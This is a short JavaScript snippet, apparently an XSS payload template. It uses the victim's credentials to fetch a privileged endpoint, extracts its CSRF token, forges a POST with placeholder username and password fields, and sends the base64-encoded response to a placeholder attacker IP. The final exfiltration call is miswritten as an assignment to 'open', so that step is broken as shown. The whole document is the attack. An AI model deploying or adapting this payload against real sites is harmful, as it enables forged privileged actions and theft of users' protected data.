//use to send data and get response back
var target = 'http://<privileged_endpoint>/';
var request1 = new XMLHttpRequest();
request1.open('GET', target, false);
request1.withCredentials = true;
request1.send();
var response = request1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, "text/html");
var token = doc.getElementsByName('_csrf_token')[0].value;

var request2 = new XMLHttpRequest();
var params = 'username=USER&pass=PASS&_csrf_token=' + token;
request2.open('POST', 'http://<privileged_endpoint>/', false);
request2.withCredentials = true;
request2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
request2.send(params);
var response2 = request2.responseText;

var request3 = new XMLHttpRequest();
request3.open = ('GET', 'http://<attacker_ip>/' + btoa(response2), true);
request3.send();
